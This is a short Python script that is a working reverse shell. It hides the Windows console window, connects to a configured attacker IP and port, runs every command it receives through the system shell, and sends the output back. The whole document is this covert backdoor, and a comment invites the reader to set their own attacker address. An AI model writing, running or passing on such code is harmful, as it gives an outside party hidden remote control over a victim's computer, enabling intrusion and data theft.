import ctypes
import socket
import subprocess
import os
import sys
# Hide the console window (only works on Windows)
def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
# Change this to the attacker's IP and port
ATTACKER_IP = '192.168.36.131'
ATTACKER_PORT = 8088
def connect():
    hide_console()
    s = socket.socket()
    s.connect((ATTACKER_IP, ATTACKER_PORT))
    while True:
        # Receive command from attacker
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        try:
            # Run the command
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            s.send(output)
        except Exception as e:
            s.send(str(e).encode())
    s.close()
connect()
